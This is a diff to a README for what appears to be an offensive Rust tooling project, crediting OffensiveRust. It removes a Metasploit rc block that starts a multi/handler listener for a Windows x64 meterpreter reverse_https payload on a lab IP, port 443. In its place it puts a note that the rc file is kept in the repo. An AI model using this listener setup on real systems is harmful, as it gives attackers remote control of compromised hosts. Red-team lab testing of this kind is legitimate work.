@@ -8,15 +8,7 @@ I have spare time.
 https://www.rust-lang.org/tools/install
 
 ## Meterpreter rc file
-All tests presented here have been performed with the following msf rc entries:
-`use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_https
-set LHOST 192.168.56.101
-set LPORT 443
-set exitfunc thread
-set stagerencode true
-run -j`
-
+All tests presented here have been performed with a meterpreter shellcode + handler. The MSF rc file is shared in this repo.
 
 ## Credits
 * https://github.com/trickster0/OffensiveRust
